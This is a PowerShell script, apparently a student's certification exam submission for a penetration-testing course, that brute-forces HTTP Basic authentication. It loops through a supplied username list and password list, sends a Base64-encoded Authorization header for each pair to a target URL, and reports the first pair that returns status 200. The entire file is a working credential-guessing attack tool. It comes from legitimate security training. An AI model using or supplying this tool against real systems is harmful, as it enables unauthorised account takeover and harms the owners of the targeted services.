#https://stackoverflow.com/questions/27951561/use-invoke-webrequest-with-a-username-and-password-for-basic-authentication-on-t
#https://www.reddit.com/r/PowerShell/comments/3z4wt8/basic_web_authentication/

function Bruteforce-Authentication

{
   
 <#
.SYNOPSIS
This powershell script bruteforce http basic authentication.

.DESCRIPTION
This powershell script bruteforce http basic authentication Using supplied username list and passwords list 

.PARAMETER Target
Specifies the the Target URL.


.PARAMETER Users
Specifies the users list file

.PARAMETER Passwords
Specifies the passwords list file


.EXAMPLE
PS C:\> . .\1st assignment.ps1
PS C:\> Bruteforce-Authentication -Target http://sometargeturl.com -Users Userslist.txt -Passwords Passwords.txt

.LINK
http://www.fabrikam.com/extension.html
https://stackoverflow.com/questions/27951561/use-invoke-webrequest-with-a-username-and-password-for-basic-authentication-on-t
https://www.reddit.com/r/PowerShell/comments/3z4wt8/basic_web_authentication/

.Note 
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3259



#>  
   
   
    [cmdletBinding()]

    param (
    [Parameter(Mandatory = $True , valuefrompipeline = $True)] $Target,
  #  [Parameter(Mandatory = $true)] $Port,
    [Parameter(Mandatory = $True)] $Users,
    [Parameter(Mandatory = $True)] $Passwords

        
    
    )

   

  #  $Victim = "http://"+ $Target_IP + ":" + $Port #
    $victim = $Target

    $Users = Get-Content $Users
    $Passwords = Get-Content $Passwords

    
    #looping through wordlist first then password list
    foreach ($user in $Users){
        
        #Loping through password list
        foreach ($password in  $Passwords) {
        #Preparing header for authentication 
        $Headers = @{ Authorization = "Basic {0}" -f [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes(("{0}:{1}" -f $user,$password))) }

        #Printing message for the current username and password that is being tested
        Write-Output("testing $user : $password")
        $message
      

    
           try {
    
            
                   $req = Invoke-WebRequest -Uri $Target -Headers $Headers

                    if ($req.statuscode -eq 200)
                    {
                      # Prints succesful auths to highlight legit creds
                      Write-Output("#!Successful login using username: $user /  password: $password")
                      Write-host $_
                      #Return when finding correct usernmae and password
                      return
                    }

            }


           catch {  
            
                    }
    
  
    
    
    
    }

    }
    #if Nothing Worked it would be recommended to try a different wordlist
    write-output("# Try another wordlist: Try Harder")

}